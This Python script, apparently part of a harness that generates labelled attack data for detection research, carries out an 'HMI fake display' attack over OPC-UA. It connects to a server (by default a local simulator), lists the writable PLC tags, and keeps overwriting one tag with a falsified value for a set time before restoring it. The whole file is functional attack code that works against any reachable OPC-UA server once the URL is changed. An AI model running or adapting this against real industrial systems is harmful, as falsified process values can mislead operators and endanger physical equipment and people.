"""
HMI_FAKE_DISPLAY
Kỹ thuật: Ghi đè OPC-UA tag từ IP attacker (asyncua).
Yêu cầu: opcua_sim_server đang chạy.

Gọi từ bash:
  python -m attacks_ext.hmi_fake_display \
      --duration 300 --opc-url opc.tcp://127.0.0.1:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import asyncio
import time
from attacks_ext.config_ext import base_parser, write_label


async def _run(args):
    label_prefix = "HMI_FAKE_DISPLAY"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s opc={args.opc_url}")

    iteration = 0

    try:
        from asyncua import Client

        async with Client(url=args.opc_url) as client:
            ns_idx = await client.get_namespace_index("PLC")
            print(f"[+] OPC-UA connected, namespace PLC = {ns_idx}")

            # Find writable tags
            plc = await client.nodes.objects.get_child(f"{ns_idx}:PLC")
            tags = {}
            for child in await plc.get_children():
                name = (await child.read_browse_name()).Name
                if "Alarm" not in name:
                    try:
                        val = await child.read_value()
                        tags[name] = (child, val)
                        print(f"  [TAG] {name} = {val}")
                    except Exception:
                        pass

            if not tags:
                print("[!] No writable tags found")
                return

            first_tag = list(tags.keys())[0]
            node, orig_val = tags[first_tag]
            fake_val = (not orig_val) if isinstance(orig_val, bool) else round(orig_val * 1.5, 2)

            print(f"\n[*] Fake display: {first_tag}: {orig_val} -> {fake_val}")

            end_time = time.time() + args.duration - 5
            while time.time() < end_time:
                await node.write_value(fake_val)
                iteration += 1
                await asyncio.sleep(2)

            await node.write_value(orig_val)
            print(f"[*] Restored {first_tag} = {orig_val}")

    except ImportError:
        print("[ERR] asyncua not installed: pip install asyncua cryptography")
    except ConnectionRefusedError:
        print(f"[ERR] OPC-UA server not running at {args.opc_url}")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"iterations={iteration}")


def run(args):
    asyncio.run(_run(args))


def main():
    p = base_parser("HMI Fake Display Attack (OPC-UA)")
    p.add_argument("--opc-url", default="opc.tcp://127.0.0.1:4840")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
